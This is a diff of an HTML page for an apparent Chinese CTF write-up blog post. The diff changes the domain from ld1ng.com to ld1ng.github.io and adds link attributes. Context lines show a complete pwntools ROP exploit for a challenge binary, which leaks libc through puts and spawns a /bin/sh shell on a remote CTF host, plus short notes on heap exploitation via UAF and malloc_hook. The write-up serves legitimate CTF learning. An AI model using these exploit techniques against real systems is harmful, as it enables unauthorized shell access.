@@ -21,7 +21,7 @@
   <meta name="description" content="0x00 前言 寒假7天乐，hxdm去实习了，就我一个带闲人，加上我也出了俩题，就没打，不过抽空上去做了做题目 主要看了密码和misc，跟着炜哥学了一点智能合约，还是挺有收获的  0x01 PWN  1.pwn1 简单ROP，，，貌似程序提供的栈地址没什么用，，，可以直接泄露got地址 但本着充分利用题目所给条件的原则，可以选择泄露栈地址 1234567891011121314151617181">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CUMTCTF2021 Winter 部分wp">
-<meta property="og:url" content="http://ld1ng.com/2021/02/01/cumtctf2021/index.html">
+<meta property="og:url" content="http://ld1ng.github.io/2021/02/01/cumtctf2021/index.html">
 <meta property="og:site_name" content="Ld1ng">
 <meta property="og:description" content="0x00 前言 寒假7天乐，hxdm去实习了，就我一个带闲人，加上我也出了俩题，就没打，不过抽空上去做了做题目 主要看了密码和misc，跟着炜哥学了一点智能合约，还是挺有收获的  0x01 PWN  1.pwn1 简单ROP，，，貌似程序提供的栈地址没什么用，，，可以直接泄露got地址 但本着充分利用题目所给条件的原则，可以选择泄露栈地址 1234567891011121314151617181">
 <meta property="og:locale" content="en_US">
@@ -60,7 +60,7 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://i.loli.net/2021/01/30/HgNusO9G1jZrqQF.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://ld1ng.com/2021/02/01/cumtctf2021/index.html">
+  <link rel="canonical" href="http://ld1ng.github.io/2021/02/01/cumtctf2021/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Ld1ng" type="application/atom+xml">
   
@@ -515,11 +515,11 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment"># context.arch='amd64'</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn3'</span>)</span><br><span class="line"><span class="comment"># p=elf.process()</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">p=remote(<span class="string">"219.219.61.234"</span>,<span class="number">40001</span>)</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x0000000000400896</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400963</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"a present:0x"</span>)</span><br><span class="line">stack=int((p.recvline().strip(<span class="string">'\n'</span>)),<span class="number">16</span>)</span><br><span class="line">info(hex(stack))</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(puts_got)+p64(puts_plt) +p64(<span class="number">0x400898</span>) </span><br><span class="line">payload+=p64(stack<span class="number">-8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">libc_base =u64(p.recvline().strip(<span class="string">'\n'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh =libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">p.recvuntil(<span class="string">"a present:0x"</span>)</span><br><span class="line">stack=int((p.recvline().strip(<span class="string">'\n'</span>)),<span class="number">16</span>)</span><br><span class="line">info(hex(stack))</span><br><span class="line"></span><br><span class="line">payload2=p64(pop_rdi) +p64(binsh)+p64(system)+p64(<span class="number">0x400898</span>) </span><br><span class="line">payload2+=p64(stack<span class="number">-8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#CUMTCTF&#123;22e369b8e6a571db987cec98&#125;</span></span><br></pre></td></tr></table></figure>
 <h2 id="4pwnvm"><a class="markdownIt-Anchor" href="#4pwnvm"></a> 4.pwnvm</h2>
 <p>虚拟机+栈溢出+沙盒orw<img src="https://i.loli.net/2021/01/30/HgNusO9G1jZrqQF.png" alt="image-20210130171347058" /></p>
-<p>见2020_9月博客==&gt;<a href="https://ld1ng.com/2020/09/28/Sep_Match/#0x01-gactf-vmpwn">vmpwn</a></p>
+<p>见2020_9月博客==&gt;<a href="https://ld1ng.com/2020/09/28/Sep_Match/#0x01-gactf-vmpwn" target="_blank" rel="noopener">vmpwn</a></p>
 <h2 id="5pwn8"><a class="markdownIt-Anchor" href="#5pwn8"></a> 5.pwn8</h2>
 <p>利用uaf漏洞，分割unsortedbin，通过构造获得fastbin，没有输出函数，爆破stdout泄露libc基址，最后将fd改为malloc_hook-0x23，从而将malloc_hook改为onegadget getshell</p>
 <p><img src="https://i.loli.net/2021/01/30/vCypuJcw3iakYhd.png" alt="image-20210130170848487" /></p>
-<p>详细见2020_11月博客==&gt;<a href="https://ld1ng.com/2020/11/30/Nov_Match/#0x05-%E4%B8%8A%E6%B5%B7%E8%B5%9B-maj0rone">上海赛wp</a></p>
+<p>详细见2020_11月博客==&gt;<a href="https://ld1ng.com/2020/11/30/Nov_Match/#0x05-%E4%B8%8A%E6%B5%B7%E8%B5%9B-maj0rone" target="_blank" rel="noopener">上海赛wp</a></p>
 <h2 id="6babyheap"><a class="markdownIt-Anchor" href="#6babyheap"></a> 6.babyheap</h2>
 <p>主要在于tcache块的构造，思想并不难但是试过好几种方法，并没找到特别取巧的思路</p>
 <p>本题特点在于用realloc分配，并且只有一个全局变量存储，所以add和delete总是要成对出现</p>
@@ -702,7 +702,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://ld1ng.com/2021/02/01/cumtctf2021/" title="CUMTCTF2021 Winter 部分wp">http://ld1ng.com/2021/02/01/cumtctf2021/</a>
+      <a href="http://ld1ng.github.io/2021/02/01/cumtctf2021/" title="CUMTCTF2021 Winter 部分wp">http://ld1ng.github.io/2021/02/01/cumtctf2021/</a>
     </li>
     
     <li class="post-copyright-license">
